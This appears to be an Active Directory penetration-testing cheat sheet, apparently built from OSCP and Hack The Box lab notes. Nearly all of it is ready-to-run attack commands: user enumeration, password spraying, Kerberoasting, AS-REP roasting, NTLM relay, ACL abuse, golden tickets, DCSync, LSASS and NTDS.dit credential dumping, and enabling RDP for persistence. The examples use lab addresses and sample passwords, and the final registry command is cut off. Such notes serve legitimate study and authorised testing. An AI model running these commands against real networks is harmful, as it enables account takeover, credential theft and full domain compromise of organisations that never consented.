### 0. Host **Discovery**

```bash
sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
```

### **1. Network & Service Discovery**

📌 _Identify open ports, services, and AD infrastructure._

🛠️ **Tools:** `nmap`, `bloodhound`, `rpcclient`, `enum4linux`, `crackmapexec`, `kerbrute`

✅ **Scan the network for AD-related services:**

```bash
nmap -sV -A <target>
```

- Get domain name
- Identify interesting ports: 80, 20, 445, 3389, 5985 (not default, scan extra!)

✅ **List domain controllers and AD hosts:**

```bash
crackmapexec smb <target>/24 --shares
```

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>
```

✅ **Check for SMB Null Sessions (Anonymous Access)**

```bash
smbclient -L //<IP> -N
enum4linux -a <IP>
```

- If successful, check shared folders for **credentials** or configuration files.

---

### **2. User Enumeration**

📌 _Find valid domain users for password attacks or Kerberoasting._

🛠️ **Tools:** `kerbrute`, `rpcclient`, `ldapsearch`, `GetADUsers.py`, `smbclient`

✅ **Enumerate Users via LDAP (if anonymous bind works)**

```bash
ldapsearch -H ldap://DC20.oscp.exam -D 'g.jarvis@oscp.exam' -w Password123 -b 'dc=oscp,dc=exam' | grep "description:"
```

- ➡️If works, windapsearch
    
    Windapsearch tool can be used to query the domain further:
    
    ```bash
    python3 /opt/windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U
    ```
    
    - ➡️➡️ If works, enumerate all objects
        
        Enumerate all objects in the AD:
        
        ```bash
        python3 /opt/windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom "objectClass=*"
        
        # Look for service accounts:
        
        python3 /opt/windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom "objectClass=*" | grep "svc-"
        CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
        ```
        
        - If found, go to [**Kerberoasting**](https://www.notion.so/Kerberoasting-85f89842598c4cde8f1d802e73387dac?pvs=21)

✅ **Enumerate Users via SMB (if anonymous access is allowed)**

```bash
rpcclient -U "" <IP>
enumdomusers

Filter:
cat unfiltered.txt | cut -d '[' -f2 | cut -d ']' -f1
```

✅ **Enumerate Users via Kerberos (User Guessing Attack)**

Download: [https://github.com/ropnop/kerbrute/releases/](https://github.com/ropnop/kerbrute/releases/)

- Works good if you found some persons on the webserver somewhere

```bash
kerbrute userenum users.txt --dc dc01.inlanefreight.local -d inlanefreight.local
```

✅ RID cycle

- Rid Enum is a RID cycling attack that attempts to enumerate user accounts through null sessions and the SID to RID enum.

```shell
netexec smb 10.10.11.231 -u guest -p '' --rid-brute

or

/usr/share/doc/python3-impacket/examples/lookupsid.py -no-pass 'guest@rebound.htb' 20000

or grep only users

/usr/share/doc/python3-impacket/examples/lookupsid.py -no-pass 'guest@rebound.htb' 8000 | grep SidTypeUser | cut -d' ' -f2 | cut -d'\\' -f2 | tee users
```

---

### **3. Password Policy & Safe Spraying**

📌 _Identify password policies to perform safe password spraying._

🛠️ **Tools:** `crackmapexec`, `Get-ADDefaultDomainPasswordPolicy`

✅ **Check password policy restrictions:**

```bash
crackmapexec ldap <DC-IP> -u <user> -p <password> --pass-pol
```

✅ **Safe password spraying (check for locked accounts first!)**

- Works good if you found a password somewhere
- **Sometimes some users use their username as password!**

```bash
sudo crackmapexec smb 192.168.110.55 -u userlist.txt -p 'P@ssw0rd' --continue-on-success
```

Or try local password spray:

```shell
crackmapexec winrm 192.168.176.96 -u users.txt -p 'New2Era4.!' --local-auth
```

```shell
awk '{print tolower($0)}' users.txt > passwords.txt
sudo crackmapexec smb 10.10.11.236 -u users.txt -p passwords.txt --continue-on-success
```

---

### **4. Credential Hunting (Low Hanging Fruits)**

📌 _Find credentials in descriptions, GPP files, shared folders, etc._

🛠️ **Tools:** `bloodhound-python`, `crackmapexec`, `secretsdump.py`, `smbclient`

✅ **Check user descriptions for leaked passwords**
```bash
ldapsearch -x -h <DC-IP> -b "DC=domain,DC=com" | grep -i "description"
```

✅ **Check Group Policy Preferences (GPP) for stored credentials**
```bash
smbclient \\\\\\\\<DC-IP>\\\\SYSVOL -U <user>
```

- Look for XML files in `SYSVOL` containing `<cpassword>`

✅ **Enumerate SMB Shares for stored passwords (do it for all machines!)**
```bash
netexec smb -u -p --shares [--get-file \\\\<filename> <filename>]

smbclient -L //<DC-IP> -U <user>
```

Anonymous SMB check:
```jsx
netexec smb <ip_range> -u '' -p ''
```

---

### **5. Common AD Attacks**

### **5.1. Kerberoasting (If any users have SPN set)**

📌 _Extract service accounts for offline cracking._

🛠️ **Tools:** `GetUserSPNs.py`, `impacket`

```bash
GetUserSPNs.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC-IP> -request
```

- Need AD user credentials
- Crack hashes using `hashcat` or `john`.

---

### **5.2. AS-REP Roasting (Users with Kerberos pre-authentication disabled)**

📌 _Extract NTLM hashes of vulnerable users for offline cracking._

🛠️ **Tools:** `GetNPUsers.py`, `hashcat`

```bash
GetNPUsers.py htb.local/svc-alfresco -no-pass -dc-ip 10.10.10.161
```

- Works mostly for operation accounts
    
- ➡️If works, crack the hash
    
    ```bash
    john hash.txt --fork=4 -w=/usr/share/wordlists/rockyou.txt
    ```
    

---

### **5.3. NTLM Relay Attacks**

📌 _Intercept authentication requests and relay them to gain access._

🛠️ **Tools:** `ntlmrelayx.py`, `Responder`

```bash
sudo responder -I eth0
ntlmrelayx.py -tf targets.txt -smb2support
```

---

### **6. Privilege Escalation (From User to Admin)**

📌 _Gain admin privileges through misconfigurations and ACL abuse._

🛠️ **Tools:** `bloodhound`, `crackmapexec`, `seatbelt`, `winpeas`

✅ **Run BloodHound to analyze attack paths**

```bash
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c All
```

- Check for:
    - **User with Delegation Rights**
    - **Users with WriteDACL privileges**
    - **GPO modifications**
    - **DCSync permissions**

✅ Look at your user in detail in AD context

```bash
Get-ADUser -identity s.smith -properties *

whoami /all
# Shows both local and AD groups
```

- You might find something what is not visible in bloodhound
    
- Pay attention on:
    
    - MemberOf
    - ScriptPath
    - Groups for local and AD escalation
- ➡️If there is a logon script
    
    You can download it with SMB:
    
    ```bash
    smbclient \\\\\\\\10.10.10.182\\\\NETLOGON -U s.smith
    ```
    

✅ Local Privilege Escalation

```bash
net user s.smith
```

- Consider local way: file. local group. processes enumeration
- Especially if you are already on the DC!

✅ **ACL Abuse (Modify User/Group Privileges)**

- If a user has **WriteDACL** on another user:

```bash
Set-ADUser -Identity victim -Replace @{memberOf="CN=Domain Admins,CN=Users,DC=domain,DC=com"}

```

✅ **Golden Ticket Attack (If `krbtgt` hash is obtained)**

```bash
mimikatz
lsadump::dcsync /domain:<domain> /user:krbtgt
```

```bash
mimikatz
kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /krbtgt:<HASH>
```

### 7. Domain Administrator compromise

✅ **AllowToDelegate attack**

Use Rubeus.exe to get Administrator’s/DC$ tgt and tgs, which enables DCSync

---

### **8. Post-Exploitation (Persistence & Exfiltration)**

📌 _After gaining Domain Admin privileges, establish persistence._

🛠️ **Tools:** `mimikatz`, `powerview`, `secretsdump.py`

✅ **Dump all credentials from LSASS**

```bash
mimikatz
sekurlsa::logonpasswords

```

✅ **Dump NTDS.dit (Full AD Credential Dump)**

```bash
secretsdump.py -just-dc <DOMAIN>/<USER>@<DC-IP>
```

✅ **Enable RDP for future access**

```powershell
reg add "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /

```